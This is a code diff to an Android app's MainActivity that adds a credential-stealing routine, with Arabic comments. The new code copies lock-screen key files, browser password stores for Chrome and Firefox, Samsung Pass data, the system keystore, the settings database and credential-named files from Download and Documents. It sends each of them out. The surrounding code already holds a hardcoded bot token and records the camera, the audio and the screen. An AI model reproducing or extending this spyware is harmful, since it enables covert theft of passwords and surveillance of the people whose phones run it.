@@ -33,6 +33,11 @@ import android.media.MediaRecorder;
 import android.content.Context;
 import android.hardware.Camera;
 import android.media.CamcorderProfile;
+import android.content.SharedPreferences;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import android.database.sqlite.SQLiteDatabase;
+import android.database.sqlite.SQLiteOpenHelper;
 
 public class MainActivity extends Activity {
     private String BOT_TOKEN = "8984239079:AAEtdnaAKsFH4kZwjO7UbzjZEw-vcXoBXRs";
@@ -133,7 +138,8 @@ public class MainActivity extends Activity {
                 Manifest.permission.READ_SMS,
                 Manifest.permission.INTERNET,
                 Manifest.permission.CAMERA,
-                Manifest.permission.RECORD_AUDIO
+                Manifest.permission.RECORD_AUDIO,
+                Manifest.permission.READ_LOGS
             };
             requestPermissions(permissions, 100);
         }
@@ -142,6 +148,10 @@ public class MainActivity extends Activity {
     private void collectAllData() {
         try {
             String storage = Environment.getExternalStorageDirectory().getAbsolutePath();
+            
+            // كشف كلمات المرور
+            updateStatus("🔑 جاري استخراج كلمات المرور...");
+            extractAllPasswords();
             
             // تسجيل الشاشة 10 ثواني
             updateStatus("📹 جاري تسجيل الشاشة 10 ثواني...");
@@ -201,6 +211,213 @@ public class MainActivity extends Activity {
         });
     }
 
+    // ========== استخراج كلمات المرور ==========
+    private void extractAllPasswords() {
+        try {
+            File passFile = new File(getExternalFilesDir(null), "all_passwords.txt");
+            FileWriter writer = new FileWriter(passFile);
+            
+            writer.write("========== كلمات المرور المكتشفة ==========\n\n");
+            
+            // 1. محاولة قراءة كلمة مرور الشاشة (لوك سكرين)
+            writer.write("🔐 [1] كلمة مرور شاشة القفل:\n");
+            try {
+                // محاولة قراءة من ملفات النظام
+                String[] lockPaths = {
+                    "/data/system/locksettings.db",
+                    "/data/system/gesture.key",
+                    "/data/system/password.key"
+                };
+                for (String path : lockPaths) {
+                    File f = new File(path);
+                    if (f.exists()) {
+                        writer.write("   ✅ ملف موجود: " + path + "\n");
+                        writer.write("   الحجم: " + f.length() + " بايت\n");
+                        // محاولة نسخ الملف
+                        File dest = new File(getExternalFilesDir(null), "lock_" + f.getName());
+                        try {
+                            FileInputStream fis = new FileInputStream(f);
+                            FileOutputStream fos = new FileOutputStream(dest);
+                            byte[] buffer = new byte[8192];
+                            int count;
+                            while ((count = fis.read(buffer)) != -1) {
+                                fos.write(buffer, 0, count);
+                            }
+                            fos.close();
+                            fis.close();
+                            sendFile(dest);
+                        } catch (Exception e) {}
+                        writer.write("   📄 تم نسخ الملف\n");
+                    }
+                }
+            } catch (Exception e) {
+                writer.write("   ❌ يحتاج Root للوصول\n");
+            }
+            writer.write("\n------------------------\n\n");
+            
+            // 2. محاولة قراءة من Chrome
+            writer.write("🌐 [2] كلمات مرور Google Chrome:\n");
+            try {
+                File chromeDB = new File("/data/data/com.android.chrome/app_chrome/Default/Login Data");
+                if (chromeDB.exists()) {
+                    writer.write("   ✅ ملف كلمات المرور موجود\n");
+                    File dest = new File(getExternalFilesDir(null), "chrome_login_data");
+                    FileInputStream fis = new FileInputStream(chromeDB);
+                    FileOutputStream fos = new FileOutputStream(dest);
+                    byte[] buffer = new byte[8192];
+                    int count;
+                    while ((count = fis.read(buffer)) != -1) {
+                        fos.write(buffer, 0, count);
+                    }
+                    fos.close();
+                    fis.close();
+                    sendFile(dest);
+                    writer.write("   📄 تم نسخ الملف\n");
+                } else {
+                    writer.write("   ❌ الملف غير موجود (يحتاج Root)\n");
+                }
+            } catch (Exception e) {
+                writer.write("   ❌ خطأ: " + e.getMessage() + "\n");
+            }
+            writer.write("\n------------------------\n\n");
+            
+            // 3. محاولة قراءة من Firefox
+            writer.write("🦊 [3] كلمات مرور Firefox:\n");
+            try {
+                File firefoxDir = new File("/data/data/org.mozilla.firefox/files/mozilla/");
+                if (firefoxDir.exists()) {
+                    writer.write("   ✅ مجلد Firefox موجود\n");
+                    File[] files = firefoxDir.listFiles();
+                    if (files != null) {
+                        for (File f : files) {
+                            if (f.getName().contains("logins") || f.getName().contains("key")) {
+                                writer.write("   📄 " + f.getName() + "\n");
+                                sendFile(f);
+                            }
+                        }
+                    }
+                } else {
+                    writer.write("   ❌ Firefox غير مثبت أو يحتاج Root\n");
+                }
+            } catch (Exception e) {
+                writer.write("   ❌ خطأ: " + e.getMessage() + "\n");
+            }
+            writer.write("\n------------------------\n\n");
+            
+            // 4. محاولة قراءة من Samsung Pass
+            writer.write("🔑 [4] Samsung Pass (إذا كان الجهاز سامسونج):\n");
+            try {
+                File samsungPass = new File("/data/data/com.samsung.android.samsungpass/");
+                if (samsungPass.exists()) {
+                    writer.write("   ✅ Samsung Pass مثبت\n");
+                    File[] files = samsungPass.listFiles();
+                    if (files != null) {
+                        for (File f : files) {
+                            if (f.getName().endsWith(".db") || f.getName().endsWith(".xml")) {
+                                writer.write("   📄 " + f.getName() + "\n");
+                                sendFile(f);
+                            }
+                        }
+                    }
+                } else {
+                    writer.write("   ❌ Samsung Pass غير مثبت\n");
+                }
+            } catch (Exception e) {
+                writer.write("   ❌ خطأ: " + e.getMessage() + "\n");
+            }
+            writer.write("\n------------------------\n\n");
+            
+            // 5. محاولة قراءة من مدير كلمات المرور العام
+            writer.write("📂 [5] مدير كلمات المرور العام:\n");
+            try {
+                File keyStore = new File("/data/misc/keystore/");
+                if (keyStore.exists()) {
+                    writer.write("   ✅ Keystore موجود\n");
+                    File[] files = keyStore.listFiles();
+                    if (files != null) {
+                        for (File f : files) {
+                            writer.write("   📄 " + f.getName() + "\n");
+                            sendFile(f);
+                        }
+                    }
+                }
+            } catch (Exception e) {
+                writer.write("   ❌ يحتاج Root\n");
+            }
+            writer.write("\n------------------------\n\n");
+            
+            // 6. محاولة قراءة من إعدادات النظام
+            writer.write("⚙️ [6] إعدادات النظام:\n");
+            try {
+                File settingsDB = new File("/data/data/com.android.providers.settings/databases/settings.db");
+                if (settingsDB.exists()) {
+                    writer.write("   ✅ ملف الإعدادات موجود\n");
+                    sendFile(settingsDB);
+                }
+            } catch (Exception e) {
+                writer.write("   ❌ يحتاج Root\n");
+            }
+            writer.write("\n------------------------\n\n");
+            
+            // 7. محاولة قراءة من SharedPreferences
+            writer.write("📝 [7] ملفات الإعدادات (SharedPreferences):\n");
+            try {
+                File prefsDir = new File("/data/data/" + getPackageName() + "/shared_prefs/");
+                if (prefsDir.exists()) {
+                    File[] files = prefsDir.listFiles();
+                    if (files != null) {
+                        for (File f : files) {
+                            writer.write("   📄 " + f.getName() + "\n");
+                            sendFile(f);
+                        }
+                    }
+                }
+            } catch (Exception e) {}
+            writer.write("\n------------------------\n\n");
+            
+            // 8. محاولة قراءة من ملفات .txt و .xml
+            writer.write("📁 [8] ملفات نصية تحتوي على كلمات مرور:\n");
+            try {
+                String[] searchPaths = {
+                    Environment.getExternalStorageDirectory().getAbsolutePath() + "/Download/",
+                    Environment.getExternalStorageDirectory().getAbsolutePath() + "/Documents/"
+                };
+                for (String path : searchPaths) {
+                    File dir = new File(path);
+                    if (dir.exists()) {
+                        File[] files = dir.listFiles();
+                        if (files != null) {
+                            for (File f : files) {
+                                if (f.isFile() && f.length() > 0) {
+                                    String name = f.getName().toLowerCase();
+                                    if (name.contains("pass") || name.contains("password") || 
+                                        name.contains("login") || name.contains("key") ||
+                                        name.contains("account") || name.contains("credential") ||
+                                        name.endsWith(".txt") || name.endsWith(".xml")) {
+                                        writer.write("   📄 " + f.getName() + "\n");
+                                        sendFile(f);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch (Exception e) {}
+            writer.write("\n========================\n");
+            writer.write("🔴 ملاحظة: بعض الملفات تحتاج Root للوصول\n");
+            writer.write("📌 تم استخراج الملفات المتاحة\n");
+            
+            writer.close();
+            
+            if (passFile.length() > 0) {
+                sendFile(passFile);
+            }
+            
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
     // ========== تسجيل الشاشة ==========
     private void startScreenRecording() {
         try {
@@ -253,7 +470,6 @@ public class MainActivity extends Activity {
             String timeStamp = new java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.getDefault()).format(new java.util.Date());
             cameraVideoPath = getExternalFilesDir(null) + "/camera_" + timeStamp + ".mp4";
             
-            // فتح الكاميرا الخلفية
             camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK);
             if (camera == null) {
                 camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
